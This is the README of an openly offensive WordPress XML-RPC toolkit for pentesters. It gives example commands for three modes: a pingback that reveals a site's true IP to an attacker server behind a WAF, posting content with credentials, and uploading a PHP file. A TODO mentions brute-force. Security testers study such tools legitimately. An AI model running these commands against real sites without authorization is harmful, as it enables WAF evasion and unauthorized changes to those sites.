# XMLRPwn
Wordpress XMLRPC toolkit for pentesters

## About

> This script is all about exploiting some native functions from Wordpress XML-RPC script.

## Installation

**pip3 install -r requirements.txt**

> after pip, just run script for help

**python3 xmlrpwn.py -h**

## Modes
> There is 3 currently modes available:

**PINGBACK**:
Try to send a pingback request to attacker's web server, useful to view true IP from application (bypass some WAF)

Ex: open a webserver ``python -m http.server 80``

``python3 xmlrpwn.py --url https://www.site.com/xmlrpc.php --mode pingback -v https://www.site.com.br/blog/example-post/1 -a http://www.attacker.com.br``

**POST**:
Try to post some blogpost example to Wordpress (username and password required)

Ex: ``python3 xmlrpwn.py -i 1 -u wordpress -p 'Password123' --url https://www.site.com/xmlrpc.php --mode post``

**UPLOAD**:
Try to upload a file to Wordpress (username and password required)

Ex: ``python3 xmlrpwn.py -i 1 -u wordpressadmin -p 'Password123' -f phpinfo.php --url https://www.site.com/xmlrpc.php --mode upload``

PS: File to upload must be on script directory.
## TODO
- Integrate Brute-force.
